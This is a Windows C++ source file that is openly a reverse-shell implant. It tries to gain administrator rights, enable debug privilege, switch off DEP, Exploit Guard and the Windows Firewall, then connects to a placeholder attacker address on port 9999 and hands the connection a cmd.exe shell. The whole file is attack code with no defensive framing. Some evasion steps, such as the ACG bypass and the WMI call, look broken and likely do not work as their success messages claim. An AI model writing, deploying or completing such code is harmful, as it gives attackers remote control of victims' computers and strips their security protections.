#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <sddl.h>
#include <netfw.h> 

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "fwpuclnt.lib")

bool SetPrivilege(HANDLE hProcess, LPCTSTR szPrivilege, BOOL bEnablePrivilege);
bool bypassACG();
bool disableDEP();
bool disableWindowsFirewall();
bool disableWDEG();
bool isElevated();
bool bypassUAC();
void execute_shell(HANDLE sock);

typedef int (WINAPI* LPFN_WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET(WINAPI* LPFN_SOCKET)(int af, int type, int protocol);
typedef int (WINAPI* LPFN_CONNECT)(SOCKET s, const struct sockaddr* name, int namelen);
typedef int (WINAPI* LPFN_WSACLEANUP)(void);

void initialize_winsock(HMODULE hWs2_32, LPFN_WSASTARTUP lpfnWSAStartup);
SOCKET create_socket(HMODULE hWs2_32, LPFN_SOCKET lpfnSocket);
void connect_to_server(HMODULE hWs2_32, LPFN_CONNECT lpfnConnect, SOCKET sock, const char* ip,int port);


bool isElevated() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup))
    {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return isAdmin;
}
bool bypassUAC() {
    if (!isElevated()) {
        HANDLE hToken;
        TOKEN_ELEVATION tokenElevation;
        DWORD dwSize;
        bool bElevated = false;

        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, sizeof(TOKEN_ELEVATION), &dwSize)) {
                bElevated = tokenElevation.TokenIsElevated;
            }
            CloseHandle(hToken);
        }
        if (!bElevated) {
            wchar_t szPath[MAX_PATH];
            GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath));

            SHELLEXECUTEINFO shExecInfo = { sizeof(shExecInfo) };
            shExecInfo.lpVerb = L"runas";
            shExecInfo.lpFile = szPath;
            shExecInfo.nShow = SW_NORMAL;

            if (!ShellExecuteEx(&shExecInfo)) {
                std::cerr << "Failed to elevate privileges. Error code: " << GetLastError() << std::endl;
                return false;
            }
        }
        else {
            std::cout << "Current process already has administrator privileges." << std::endl;
        }
    }
    else {
        std::cout << "Current process already has administrator privileges." << std::endl;
    }
    return true;
}
bool SetPrivilege(HANDLE hProcess, LPCTSTR szPrivilege, BOOL bEnablePrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error code: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, szPrivilege, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}
bool bypassACG() {
    HANDLE hProcess = GetCurrentProcess();
    if (hProcess == NULL) {
        std::cerr << "Failed to get handle to current process. Error code: " << GetLastError() << std::endl;
        return false;
    }
    if (!SetPrivilege(hProcess, SE_DEBUG_NAME, true)) {
        std::cerr << "Failed to enable SE_DEBUG_NAME privilege." << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL) {
        std::cerr << "Failed to get handle to current module. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    if (!VirtualProtectEx(hProcess, hModule, 0x1000, PAGE_EXECUTE_READWRITE, NULL)) {
        std::cerr << "Failed to change memory protection. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "Successfully bypassed Arbitrary Code Guard (ACG)." << std::endl;
    CloseHandle(hProcess);
    return true;
}
bool disableWindowsFirewall() {
    HRESULT hr = S_OK;
    INetFwPolicy2* fwPolicy2 = NULL;

    hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM. Error code: " << std::hex << hr << std::endl;
        return false;
    }
    hr = CoCreateInstance(__uuidof(NetFwPolicy2), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (void**)&fwPolicy2);
    if (FAILED(hr)) {
        std::cerr << "Failed to create INetFwPolicy2 instance. Error code: " << std::hex << hr << std::endl;
        CoUninitialize();
        return false;
    }
    hr = fwPolicy2->put_FirewallEnabled(NET_FW_PROFILE2_PRIVATE, VARIANT_FALSE);
    if (FAILED(hr)) {
        std::cerr << "Failed to disable Windows Firewall. Error code: " << std::hex << hr << std::endl;
        fwPolicy2->Release();
        CoUninitialize();
        return false;
    }
    fwPolicy2->Release();
    CoUninitialize();

    std::cout << "Windows Firewall disabled successfully." << std::endl;
    return true;
}
bool disableWDEG() {
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    IWbemClassObject* pClassObj = NULL;
    IWbemClassObject* pOutParams = NULL;
    ULONG uReturn = 0;

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::cerr << "Failed to initialize COM library. Error code = 0x"
            << std::hex << hres << std::endl;
        return false;
    }
    
    hres = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to initialize security. Error code = 0x"
            << std::hex << hres << std::endl;
        CoUninitialize();
        return false;
    }

    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator,
        (LPVOID*)&pLoc
    );

    if (FAILED(hres)) {
        std::cerr << "Failed to create IWbemLocator object. Error code = 0x"
            << std::hex << hres << std::endl;
        CoUninitialize();
        return false;
    }

    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        NULL,
        NULL,
        0,
        NULL,
        0,
        0,
        &pSvc
    );

    if (FAILED(hres)) {
        std::cerr << "Could not connect to WMI. Error code = 0x"
            << std::hex << hres << std::endl;
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );

    if (FAILED(hres)) {
        std::cerr << "Could not set proxy blanket. Error code = 0x"
        << std::hex << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = pSvc->ExecQuery(
        _bstr_t("WQL"),
        _bstr_t("SELECT * FROM Win32_DeviceGuard"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator
    );

    if (FAILED(hres)) {
        std::cerr << "Query for Win32_DeviceGuard failed. Error code = 0x"
            << std::hex << hres << std::endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = pEnumerator->Next(WBEM_INFINITE, 1,
        &pClassObj, &uReturn);

    if (FAILED(hres)) {
        std::cerr << "Failed to get device guard class object. Error code = 0x"
            << std::hex << hres << std::endl;
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = pClassObj->GetMethod(
        L"Set-DeviceGuardVirtualizationOptions",
        0, NULL, &pOutParams);

    if (FAILED(hres)) {
        std::cerr << "Failed to get Set-DeviceGuardVirtualizationOptions method. Error code = 0x"
            << std::hex << hres << std::endl;
        pClassObj->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    hres = pSvc->ExecMethod(
        _bstr_t(L"Win32_DeviceGuard"),
        _bstr_t(L"Set-DeviceGuardVirtualizationOptions"),
        0, NULL, NULL, NULL, NULL);

    if (FAILED(hres)) {
        std::cerr << "Failed to execute method Set-DeviceGuardVirtualizationOptions. Error code = 0x"
            << std::hex << hres << std::endl;
        pOutParams->Release();
        pClassObj->Release();
        pEnumerator->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return false;
    }

    std::cout << "Windows Defender Exploit Guard (WDEG) has been disabled successfully." << std::endl;

    pOutParams->Release();
    pClassObj->Release();
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return true;
}
bool disableDEP() {
    typedef BOOL(WINAPI* LPSetProcessDEPPolicy)(DWORD dwFlags);
    HMODULE hKernel32 = LoadLibrary(TEXT("kernel32.dll"));
    if (hKernel32 == NULL) {
        std::cerr << "Failed to load kernel32.dll. Error code: " << GetLastError() << std::endl;
        return false;
    }
    LPSetProcessDEPPolicy pfnSetProcessDEPPolicy = (LPSetProcessDEPPolicy)GetProcAddress(hKernel32, "SetProcessDEPPolicy");
    if (pfnSetProcessDEPPolicy == NULL) {
        std::cerr << "Failed to get SetProcessDEPPolicy function pointer. Error code: " << GetLastError() << std::endl;
        FreeLibrary(hKernel32);
        return false;
    }
    if (!pfnSetProcessDEPPolicy(0)) {
        std::cerr << "Failed to disable DEP. Error code: " << GetLastError() << std::endl;
        FreeLibrary(hKernel32);
        return false;
    }
    FreeLibrary(hKernel32);
    return true;
}
void initialize_winsock(HMODULE hWs2_32, LPFN_WSASTARTUP lpfnWSAStartup) {
    WSADATA wsaData;
    int result;

    result = lpfnWSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        exit(1);
    }
}

SOCKET create_socket(HMODULE hWs2_32, LPFN_SOCKET lpfnSocket) {
    SOCKET sock = lpfnSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %ld\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }
    return sock;
}

void connect_to_server(HMODULE hWs2_32, LPFN_CONNECT lpfnConnect, SOCKET sock, const char* ip, int port) {
    struct sockaddr_in server_addr;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    int result = lpfnConnect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (result == SOCKET_ERROR) {
        printf("Connection to server failed: %ld\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    printf("Connected to server %s:%d\n", ip, port);
}
void execute_shell(HANDLE sock) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = sock;
    si.hStdOutput = sock;
    si.hStdError = sock;

    ZeroMemory(&pi, sizeof(pi));

    wchar_t command[] = L"cmd.exe";
    if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %ld\n", GetLastError());
        closesocket((SOCKET)sock);
        WSACleanup();
        exit(1);
    }
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
int main() {
    HANDLE hProcess = GetCurrentProcess();
    LPCTSTR szPrivilege = SE_DEBUG_NAME;  
    BOOL bEnablePrivilege = TRUE;  
    isElevated();
    bypassUAC();
    if (SetPrivilege(hProcess, szPrivilege, bEnablePrivilege)) {
        std::cout << "SetPrivilege succeeded!" << std::endl;
    }
    else {
        std::cerr << "SetPrivilege failed." << std::endl;
    }
    bypassACG();
    disableDEP();
    disableWDEG();
    disableWindowsFirewall();

    const char* server_ip = "ip";
    int server_port = 9999;

    HMODULE hWs2_32 = LoadLibraryA("ws2_32.dll");
    if (hWs2_32 == NULL) {
        printf("Failed to load ws2_32.dll\n");
        return 1;
    }
    LPFN_WSASTARTUP lpfnWSAStartup = (LPFN_WSASTARTUP)GetProcAddress(hWs2_32, "WSAStartup");
    LPFN_SOCKET lpfnSocket = (LPFN_SOCKET)GetProcAddress(hWs2_32, "socket");
    LPFN_CONNECT lpfnConnect = (LPFN_CONNECT)GetProcAddress(hWs2_32, "connect");
    LPFN_WSACLEANUP lpfnWSACleanup = (LPFN_WSACLEANUP)GetProcAddress(hWs2_32, "WSACleanup");

    if (!lpfnWSAStartup || !lpfnSocket || !lpfnConnect || !lpfnWSACleanup) {
        printf("Failed to get function addresses\n");
        FreeLibrary(hWs2_32);
        return 1;
    }
    initialize_winsock(hWs2_32, lpfnWSAStartup);
    SOCKET sock = create_socket(hWs2_32, lpfnSocket);
    connect_to_server(hWs2_32, lpfnConnect, sock, server_ip, server_port);
    execute_shell((HANDLE)sock);

    closesocket(sock);
    lpfnWSACleanup();
    FreeLibrary(hWs2_32);

    return 0;
}
